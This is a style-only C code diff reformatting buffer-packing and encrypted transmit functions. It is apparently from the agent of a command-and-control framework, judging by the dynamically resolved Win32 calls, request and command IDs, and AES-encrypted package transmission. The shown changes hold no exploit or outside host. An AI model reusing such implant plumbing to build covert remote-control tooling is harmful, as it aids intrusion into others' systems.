@@ -35,18 +35,23 @@ VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
     Buffer[ 0 ] = Value & 0xFF;
 }
 
-VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
-{
+VOID Int32ToBuffer(
+    OUT PUCHAR Buffer,
+    IN  UINT32 Size
+) {
     ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
     ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
     ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
     ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
 }
 
-VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
-{
-    if ( ! Package )
+VOID PackageAddInt32(
+    IN OUT PPACKAGE Package,
+    IN     UINT32   Data
+) {
+    if ( ! Package ) {
         return;
+    }
 
     Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
@@ -54,7 +59,7 @@ VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
             LMEM_MOVEABLE
     );
 
-    Int32ToBuffer( Package->Buffer + Package->Length, dataInt );
+    Int32ToBuffer( Package->Buffer + Package->Length, Data );
 
     Package->Size   =   Package->Length;
     Package->Length +=  sizeof( UINT32 );
@@ -62,8 +67,9 @@ VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
 
 VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
 {
-    if ( ! Package )
+    if ( ! Package ) {
         return;
+    }
 
     Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
@@ -77,7 +83,7 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
     Package->Length += sizeof( UINT64 );
 }
 
-VOID PackageAddPtr( PPACKAGE Package, PVOID pointer)
+VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )
 {
     PackageAddInt64( Package, ( UINT64 ) pointer );
 }
@@ -179,8 +185,9 @@ PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
     return Package;
 }
 
-VOID PackageDestroy( PPACKAGE Package )
-{
+VOID PackageDestroy(
+    IN PPACKAGE Package
+) {
     if ( ! Package ) {
         return;
     }
@@ -199,8 +206,11 @@ VOID PackageDestroy( PPACKAGE Package )
     Package = NULL;
 }
 
-BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
-{
+BOOL PackageTransmit(
+    IN OUT PPACKAGE Package,
+    OUT    PVOID*   Response,
+    OUT    PSIZE_T  Size
+) {
     AESCTX AesCtx  = { 0 };
     BOOL   Success = FALSE;
     UINT32 Padding = 0;
@@ -247,8 +257,10 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
     return Success;
 }
 
-VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
-{
+VOID PackageTransmitError(
+    IN UINT32 ID,
+    IN UINT32 ErrorCode
+) {
     PPACKAGE Package = NULL;
 
     PRINTF( "Transmit Error: %d\n", ErrorCode );
